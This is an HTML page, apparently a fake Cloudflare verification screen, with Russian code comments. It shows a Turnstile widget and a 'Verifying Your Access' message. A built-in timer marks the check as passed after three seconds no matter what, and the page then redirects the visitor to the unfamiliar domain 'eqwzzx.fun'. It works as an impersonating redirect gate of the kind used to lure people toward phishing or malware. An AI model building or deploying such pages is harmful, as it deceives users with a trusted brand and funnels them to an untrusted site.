<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloudflare Verification Challenge</title>
    <!-- Cloudflare Turnstile Script -->
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #1a1a1a, #2c2c2c);
            font-family: 'Arial', sans-serif;
            color: #ffffff;
            overflow: hidden;
        }
        .container {
            text-align: center;
            padding: 40px;
            background: rgba(0, 0, 0, 0.7);
            border-radius: 15px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(10px);
            max-width: 400px;
        }
        .loader {
            width: 60px;
            height: 60px;
            border: 5px solid #3498db;
            border-top: 5px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .pulse {
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.1); opacity: 0.7; }
            100% { transform: scale(1); opacity: 1; }
        }
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
            color: #3498db;
        }
        p {
            font-size: 16px;
            color: #cccccc;
            margin-bottom: 20px;
        }
        .progress-bar {
            width: 200px;
            height: 5px;
            background: #444;
            border-radius: 5px;
            overflow: hidden;
            margin: 20px auto;
        }
        .progress {
            width: 0;
            height: 100%;
            background: #3498db;
            animation: progress 3s ease-in-out forwards;
        }
        @keyframes progress {
            0% { width: 0; }
            100% { width: 100%; }
        }
        .verified {
            display: none;
            color: #2ecc71;
            font-size: 32px;
            font-weight: bold;
            margin-top: 20px;
        }
        .captcha-container {
            width: 304px;
            height: 78px;
            margin: 20px auto;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .error-message {
            color: #e74c3c;
            font-size: 14px;
            display: none;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h1 class="pulse">Verifying Your Access</h1>
        <p>Please complete the challenge below to verify you are not a bot...</p>
        <div class="captcha-container">
            <div class="cf-turnstile" data-sitekey="0x1A2EEDEdC8df6Cf86891Cbe1581Bd94A4e4657A6" data-callback="onCaptchaSuccess" data-error-callback="onCaptchaError"></div>
        </div>
        <div class="progress-bar">
            <div class="progress"></div>
        </div>
        <p class="verified">Verification Successful!</p>
        <p class="error-message">Verification failed. Please try again.</p>
    </div>
    <script>
        // Callback для успешной проверки капчи
        function onCaptchaSuccess(token) {
            document.querySelector('.loader').style.display = 'none';
            document.querySelector('.pulse').style.display = 'none';
            document.querySelector('p:not(.verified):not(.error-message)').style.display = 'none';
            document.querySelector('.progress-bar').style.display = 'none';
            document.querySelector('.captcha-container').style.display = 'none';
            document.querySelector('.verified').style.display = 'block';
            document.querySelector('.error-message').style.display = 'none';
            // Перенаправление на целевую страницу (настройте URL)
            setTimeout(() => {
                window.location.href = 'https://eqwzzx.fun';
            }, 1000);
        }

        // Callback для ошибки капчи
        function onCaptchaError() {
            document.querySelector('.error-message').style.display = 'block';
            document.querySelector('.loader').style.display = 'none';
        }

        // Симуляция проверки для тестирования (удалите в продакшене)
        setTimeout(() => {
            if (!document.querySelector('.verified').style.display) {
                onCaptchaSuccess('simulated-token');
            }
        }, 3000);
    </script>
</body>
</html>
